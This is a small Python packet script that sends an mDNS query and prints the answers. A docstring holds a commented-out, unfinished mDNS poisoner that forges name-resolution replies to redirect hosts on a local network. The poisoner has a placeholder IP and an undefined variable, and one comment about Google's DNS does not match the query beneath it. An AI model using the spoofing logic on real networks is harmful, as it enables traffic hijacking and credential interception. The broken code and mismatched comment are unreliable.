from All import *
from Ndp import NDPRouterAdv, NDPRouterSol
"""
mDNS Poisoner:
def ismatch_mdns(pkt: Ether):
    return UDP in pkt and 5353 in (pkt[UDP].sport, pkt[UDP].dport) and DNSQR in pkt and 'testDomainName' in pkt[DNSQR][0].qname.lower()

def onmatch_mdns(pkt: Ether):
    print(f"Spoofing response for: {pkt[DNSQR][0].qname} ip={pkt[IP].psrc}")
    psrc = pkt[IP].psrc
    sport = pkt[UDP].sport
    dport = pkt[UDP].dport
    myIp = .......
    
    # Must send both ipv4 and ipv6 versions of the spoofed mDNS response
    # in order for Windows 10 to register the spoofed domain.
    spoofed_response_v4 = Ether(dst=pkt.src)/IP(dst=psrc)/\
    UDP(sport=dport, dport=sport)/DNS(id=pkt[DNS].id, an=DNSRR(name="bruhh.local", rdata=myIp, ttl=120))
    
    send(spoofed_response)


sniff(ismatch_mdns, onmatch_mdns)
"""

# Resolve google.com by querying google's DNS server (8.8.8.8)
pkt = Ether() / IP(dst="224.0.0.251") / UDP(dport=5353) / DNS(qd=DNSQR(qname="oripc.local"))

# IP may come back either to the multicast address, or directly to the host PC's IP.
# Which means that you can't tell whether a packet is an answer to `pkt` based on
# the dst and src IP inside it, so we set flipIP to False
ans = sendreceive(pkt, flipIP=False)

for answer_record in ans.an:
    print(answer_record.rdata)